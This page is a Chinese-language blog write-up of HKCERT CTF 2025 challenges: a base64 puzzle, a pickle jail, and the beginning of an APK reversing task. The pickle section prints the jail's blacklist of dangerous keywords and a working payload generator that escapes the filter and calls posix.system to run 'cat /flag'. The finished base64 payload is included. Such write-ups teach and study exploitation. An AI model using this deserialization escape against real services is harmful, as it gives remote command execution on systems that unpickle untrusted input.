<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.1">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","social":{"GitHub":"https://github.com/rekjorekjo || fab fa-github"},"padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"github","dark":"github-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="HKCERT CTF 2025 [TOC] misc Questionnaire   略   Easy_Base   Newcomer, the academy has given you a set of weapons capable of killing the Dragon King, but the text on them seems a bit hard to read (flag">
<meta property="og:type" content="article">
<meta property="og:title" content="HKCERT_CTF2025">
<meta property="og:url" content="http://example.com/2025/12/31/HKCERT-CTF2025/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="HKCERT CTF 2025 [TOC] misc Questionnaire   略   Easy_Base   Newcomer, the academy has given you a set of weapons capable of killing the Dragon King, but the text on them seems a bit hard to read (flag">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/image-20251225230436279.png">
<meta property="og:image" content="http://example.com/2025/12/31/HKCERT-CTF2025/images/image-20251231171746553.png">
<meta property="og:image" content="http://example.com/2025/12/31/HKCERT-CTF2025/images/image-20251231171846993.png">
<meta property="og:image" content="http://example.com/images/QianJianTec1767188383372.png">
<meta property="og:image" content="http://example.com/images/QianJianTec1767188428720.png">
<meta property="og:image" content="http://example.com/images/QianJianTec1767188508573.png">
<meta property="og:image" content="http://example.com/images/QianJianTec1767188553168.png">
<meta property="og:image" content="http://example.com/images/QianJianTec1767188585075.png">
<meta property="og:image" content="http://example.com/images/QianJianTec1767188622752.png">
<meta property="og:image" content="http://example.com/images/QianJianTec1767189341815.png">
<meta property="article:published_time" content="2025-12-31T13:35:11.000Z">
<meta property="article:modified_time" content="2025-12-31T13:56:27.889Z">
<meta property="article:author" content="Rekjo">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/image-20251225230436279.png">


<link rel="canonical" href="http://example.com/2025/12/31/HKCERT-CTF2025/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2025/12/31/HKCERT-CTF2025/","path":"2025/12/31/HKCERT-CTF2025/","title":"HKCERT_CTF2025"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>HKCERT_CTF2025 | Hexo</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  






  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js" defer></script>



  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Hexo</p>
      <i class="logo-line"></i>
    </a>
      <img class="custom-logo-image" src="/images/headimage.jpg" alt="Hexo">
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HKCERT-CTF-2025"><span class="nav-text">HKCERT CTF 2025</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misc"><span class="nav-text">misc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-text">Reverse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-text"> </span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#-1"><span class="nav-text"> </span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#-2"><span class="nav-text"> </span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#-3"><span class="nav-text"> </span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#-4"><span class="nav-text"> </span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Rekjo"
      src="/images/headimage.jpg">
  <p class="site-author-name" itemprop="name">Rekjo</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">5</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/rekjorekjo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;rekjorekjo" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/12/31/HKCERT-CTF2025/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/headimage.jpg">
      <meta itemprop="name" content="Rekjo">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="HKCERT_CTF2025 | Hexo">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HKCERT_CTF2025
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2025-12-31 21:35:11 / Modified: 21:56:27" itemprop="dateCreated datePublished" datetime="2025-12-31T21:35:11+08:00">2025-12-31</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="HKCERT-CTF-2025"><a href="#HKCERT-CTF-2025" class="headerlink" title="HKCERT CTF 2025"></a>HKCERT CTF 2025</h2><hr>
<p>[TOC]</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a><strong>misc</strong></h2><ul>
<li>Questionnaire</li>
</ul>
<blockquote>
<p>略</p>
</blockquote>
<ul>
<li>Easy_Base</li>
</ul>
<blockquote>
<p>Newcomer, the academy has given you a set of weapons capable of killing the Dragon King, but the text on them seems a bit hard to read (flag format: flag{xx_xx})</p>
</blockquote>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Zg====AbYQ====wZew====ARZQ====gbaQ====QcdQ====QZdQ====gYaQ====QZcg====QadA====wXcw====QYbg====wZdQ====Qacw====QYZw====AbYQ====AZaQ====wbcg====QZZw====Qacw====Qf</span><br></pre></td></tr></table></figure>
<p>看到字符串挺懵的，首先看到=很像base64/base32，但是base32字符集没这么大，只能是base64</p>
<p>那么多=?姑且当垃圾字节来看，那我们直接解密base64</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">66 00 1b 61 0c 19 7b 00 11 65 08 1b 69 04 1c 75 04 19 75 08 18 69 04 19 72 04 1a 74 0c 17 73 04 18 6e 0c 19 75 04 1a 73 04 18 67 00 1b 61 00 19 69 0c 1b 72 04 19 67 04 1a 73 04 1f</span><br></pre></td></tr></table></figure>
<p>不可见字符全部用hex代替</p>
<p>开头第一个就是f，这很可疑。于是看看“flag”base64之后得到啥？</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l -&gt; bA==</span><br><span class="line">a -&gt; YQ==</span><br><span class="line">g -&gt; Zw==</span><br></pre></td></tr></table></figure>
<p>事已至此，可以发现出题人的小心思了：==垃圾全部删掉，每两个ASCII为一组解码。其中偶数位置需要倒置</p>
<p>ai一把梭，<strong>flag{Deniqueubierit_sanguisagladioregis}</strong></p>
<ul>
<li>easyJail</li>
</ul>
<blockquote>
<p>Very easy pickle jail，go ahead !</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pylint: disable = unnecessary-lambda-assignment, protected-access, redefined-builtin</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">_dispatch = pickle._Unpickler.dispatch</span><br><span class="line"></span><br><span class="line">_noop = <span class="keyword">lambda</span> *_: <span class="literal">None</span></span><br><span class="line">_noop_code = _noop.__code__</span><br><span class="line"></span><br><span class="line">_DISABLED_OPCODES = [</span><br><span class="line">    pickle.NEWOBJ_EX[<span class="number">0</span>],</span><br><span class="line">    pickle.INST[<span class="number">0</span>],</span><br><span class="line">    pickle.REDUCE[<span class="number">0</span>],</span><br><span class="line">    pickle.OBJ[<span class="number">0</span>],</span><br><span class="line">    pickle.NEWOBJ[<span class="number">0</span>],</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> opcode <span class="keyword">in</span> _DISABLED_OPCODES:</span><br><span class="line">    _dispatch.pop(opcode)</span><br><span class="line"></span><br><span class="line">pickle._Unpickler.dispatch = _dispatch</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> method_name <span class="keyword">in</span> (</span><br><span class="line">    <span class="string">&quot;load_newobj_ex&quot;</span>,</span><br><span class="line">    <span class="string">&quot;load_obj&quot;</span>,</span><br><span class="line">    <span class="string">&quot;load_reduce&quot;</span>,</span><br><span class="line">    <span class="string">&quot;load_newobj&quot;</span>,</span><br><span class="line">    <span class="string">&quot;load_inst&quot;</span>,</span><br><span class="line">):</span><br><span class="line">    handler = <span class="built_in">getattr</span>(pickle._Unpickler, method_name)</span><br><span class="line">    handler.__code__ = _noop_code</span><br><span class="line"></span><br><span class="line">__builtins__ = &#123;</span><br><span class="line">    <span class="string">&quot;input&quot;</span>: <span class="built_in">input</span>,</span><br><span class="line">    <span class="string">&quot;ValueError&quot;</span>: ValueError,</span><br><span class="line">    <span class="string">&quot;bytes&quot;</span>: <span class="built_in">bytes</span>,</span><br><span class="line">    <span class="string">&quot;isinstance&quot;</span>: <span class="built_in">isinstance</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> _dispatch</span><br><span class="line"><span class="keyword">del</span> _noop</span><br><span class="line"><span class="keyword">del</span> _noop_code</span><br><span class="line"><span class="keyword">del</span> _DISABLED_OPCODES</span><br><span class="line"><span class="keyword">del</span> opcode</span><br><span class="line"></span><br><span class="line">_BLACKLISTED_SUBSTRINGS = &#123;</span><br><span class="line">    <span class="string">&quot;var&quot;</span>,</span><br><span class="line">    <span class="string">&quot;input&quot;</span>,</span><br><span class="line">    <span class="string">&quot;builtin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;set&quot;</span>,</span><br><span class="line">    <span class="string">&quot;get&quot;</span>,</span><br><span class="line">    <span class="string">&quot;import&quot;</span>,</span><br><span class="line">    <span class="string">&quot;open&quot;</span>,</span><br><span class="line">    <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sys&quot;</span>,</span><br><span class="line">    <span class="string">&quot;eval&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>,</span><br><span class="line">    <span class="string">&quot;compile&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">loads</span>(<span class="params">data: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data, <span class="built_in">bytes</span>):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;expected bytes&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> token <span class="keyword">in</span> _BLACKLISTED_SUBSTRINGS:</span><br><span class="line">        <span class="keyword">if</span> token.encode() <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;<span class="subst">&#123;token&#125;</span> not allowed&quot;</span>)</span><br><span class="line"></span><br><span class="line">    buffer = BytesIO(data)</span><br><span class="line">    <span class="keyword">return</span> pickle._Unpickler(buffer).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">opcode = b64decode(<span class="built_in">input</span>(<span class="string">&quot;Enter your pickle: &quot;</span>).encode())</span><br><span class="line"><span class="keyword">del</span> b64decode</span><br><span class="line">loads(opcode)</span><br></pre></td></tr></table></figure>
<p>if token.encode() in data 检查了黑名单”var”,”input”,”builtin”,”set”,”get”,”import”,”open”,”subprocess”,”sys”,”eval”,”exec”,”os”,”compile”</p>
<p>但是导入了pickle解释器，可以转义绕过</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pickle支持的转义序列</span><br><span class="line">\xhh - 十六进制（如 \x6f = &#x27;o&#x27;）</span><br><span class="line">\ooo - 八进制</span><br><span class="line">\n, \r, \t 等标准转义</span><br><span class="line">\\ - 反斜杠本身</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_DISABLED_OPCODES = [</span><br><span class="line">    pickle.NEWOBJ_EX[<span class="number">0</span>],  <span class="comment"># 禁用创建对象</span></span><br><span class="line">    pickle.INST[<span class="number">0</span>],       <span class="comment"># 禁用实例化</span></span><br><span class="line">    pickle.REDUCE[<span class="number">0</span>],     <span class="comment"># 禁用REDUCE指令 - 非常重要！</span></span><br><span class="line">    pickle.OBJ[<span class="number">0</span>],        <span class="comment"># 禁用OBJ指令</span></span><br><span class="line">    pickle.NEWOBJ[<span class="number">0</span>],     <span class="comment"># 禁用NEWOBJ指令</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>注意到<code>BUILD</code> 指令（操作码 <code>b</code>）没有被禁用</p>
<p>可以导入 os.path。<br>动态地给 os.path 模块添加一个 <strong>setstate</strong> 方法（指向 system 函数）。<br>再次调用 BUILD 传入 cat /flag。<br>pickle 内部逻辑会检测到 <strong>setstate</strong> 存在，调用：os.path.<strong>setstate</strong>(“cat /flag”)。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>(<span class="params">command</span>):</span><br><span class="line">    <span class="comment"># 将字符串转换为 \uXXXX 格式以绕过黑名单检查</span></span><br><span class="line">    <span class="comment"># 因为 blacklist 检查的是原始字节流，b&#x27;os&#x27; 不在 b&#x27;\\u006f\\u0073&#x27; 中</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">escape</span>(<span class="params">s</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(<span class="string">f&quot;\\u<span class="subst">&#123;<span class="built_in">ord</span>(c):04x&#125;</span>&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># \x80\x04: Protocol 4</span></span><br><span class="line">    <span class="comment"># \x93: STACK_GLOBAL (获取模块/函数)</span></span><br><span class="line">    <span class="comment"># b: BUILD (用于触发执行)</span></span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">b&quot;\x80\x04&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 1. 获取 os.path 模块</span></span><br><span class="line">    payload += <span class="string">b&quot;V&quot;</span> + escape(<span class="string">&quot;os&quot;</span>).encode() + <span class="string">b&quot;\n&quot;</span></span><br><span class="line">    payload += <span class="string">b&quot;V&quot;</span> + escape(<span class="string">&quot;path&quot;</span>).encode() + <span class="string">b&quot;\n&quot;</span></span><br><span class="line">    payload += <span class="string">b&quot;\x93&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 准备字典 &#123; &quot;__setstate__&quot;: posix.system &#125;</span></span><br><span class="line">    payload += <span class="string">b&quot;(&quot;</span></span><br><span class="line">    payload += <span class="string">b&quot;V&quot;</span> + escape(<span class="string">&quot;__setstate__&quot;</span>).encode() + <span class="string">b&quot;\n&quot;</span></span><br><span class="line">    payload += <span class="string">b&quot;V&quot;</span> + escape(<span class="string">&quot;posix&quot;</span>).encode() + <span class="string">b&quot;\n&quot;</span></span><br><span class="line">    payload += <span class="string">b&quot;V&quot;</span> + escape(<span class="string">&quot;system&quot;</span>).encode() + <span class="string">b&quot;\n&quot;</span></span><br><span class="line">    payload += <span class="string">b&quot;\x93&quot;</span></span><br><span class="line">    payload += <span class="string">b&quot;d&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 第一次 BUILD: 将 os.path.__setstate__ 设为 posix.system</span></span><br><span class="line">    payload += <span class="string">b&quot;b&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 4. 第二次 BUILD: 传入命令字符串，触发 os.path.__setstate__(command)</span></span><br><span class="line">    payload += <span class="string">b&quot;V&quot;</span> + command.encode() + <span class="string">b&quot;\n&quot;</span></span><br><span class="line">    payload += <span class="string">b&quot;b&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 5. 结束</span></span><br><span class="line">    payload += <span class="string">b&quot;.&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(payload).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成读取 flag 的 payload</span></span><br><span class="line">final_b64 = generate_payload(<span class="string">&quot;cat /flag&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Final Payload: <span class="subst">&#123;final_b64&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>攻击payload:gARWXHUwMDZmXHUwMDczClZcdTAwNzBcdTAwNjFcdTAwNzRcdTAwNjgKkyhWXHUwMDVmXHUwMDVmXHUwMDczXHUwMDY1XHUwMDc0XHUwMDczXHUwMDc0XHUwMDYxXHUwMDc0XHUwMDY1XHUwMDVmXHUwMDVmClZcdTAwNzBcdTAwNmZcdTAwNzNcdTAwNjlcdTAwNzgKVlx1MDA3M1x1MDA3OVx1MDA3M1x1MDA3NFx1MDA2NVx1MDA2ZAqTZGJWY2F0IC9mbGFnCmIu</p>
<p><strong>flag{hMbo8rrvlHgS86k3TgXhZGHlGt5WDQSp}</strong></p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a><strong>Reverse</strong></h2><ul>
<li>one_by_one</li>
</ul>
<blockquote>
<p>We need to decrypt it</p>
</blockquote>
<p>发现给了onebypne.apk，第二次挑战apk逆向</p>
<p>jadx打开</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">先认识JADX-GUI的主要区域：</span><br><span class="line"></span><br><span class="line">左侧：文件树，显示包结构</span><br><span class="line"></span><br><span class="line">中间：代码查看区</span><br><span class="line"></span><br><span class="line">右侧：大纲视图（类、方法列表）</span><br><span class="line"></span><br><span class="line">底部：日志/搜索结果</span><br></pre></td></tr></table></figure>
<p>在/res下找到AndroidMainFest.xml</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;manifest xmlns:android=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="line">    android:versionCode=<span class="string">&quot;1&quot;</span></span><br><span class="line">    android:versionName=<span class="string">&quot;1.0&quot;</span></span><br><span class="line">    android:compileSdkVersion=<span class="string">&quot;32&quot;</span></span><br><span class="line">    android:compileSdkVersionCodename=<span class="string">&quot;12&quot;</span></span><br><span class="line">    <span class="keyword">package</span>=<span class="string">&quot;com.example.onebyone&quot;</span></span><br><span class="line">    platformBuildVersionCode=<span class="string">&quot;32&quot;</span></span><br><span class="line">    platformBuildVersionName=<span class="string">&quot;12&quot;</span>&gt;</span><br><span class="line">    &lt;uses-sdk</span><br><span class="line">        android:minSdkVersion=<span class="string">&quot;21&quot;</span></span><br><span class="line">        android:targetSdkVersion=<span class="string">&quot;32&quot;</span>/&gt;</span><br><span class="line">    &lt;application</span><br><span class="line">        android:theme=<span class="string">&quot;@style/Theme.Onebyone&quot;</span></span><br><span class="line">        android:label=<span class="string">&quot;@string/app_name&quot;</span></span><br><span class="line">        android:icon=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span><br><span class="line">        android:debuggable=<span class="string">&quot;true&quot;</span></span><br><span class="line">        android:allowBackup=<span class="string">&quot;true&quot;</span></span><br><span class="line">        android:supportsRtl=<span class="string">&quot;true&quot;</span></span><br><span class="line">        android:fullBackupContent=<span class="string">&quot;@xml/backup_rules&quot;</span></span><br><span class="line">        android:roundIcon=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span><br><span class="line">        android:appComponentFactory=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span></span><br><span class="line">        android:dataExtractionRules=<span class="string">&quot;@xml/data_extraction_rules&quot;</span>&gt;</span><br><span class="line">        &lt;activity</span><br><span class="line">            android:name=<span class="string">&quot;com.example.onebyone.MainActivity&quot;</span></span><br><span class="line">            android:exported=<span class="string">&quot;true&quot;</span>&gt;</span><br><span class="line">            &lt;intent-filter&gt;</span><br><span class="line">                &lt;action android:name=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span><br><span class="line">                &lt;category 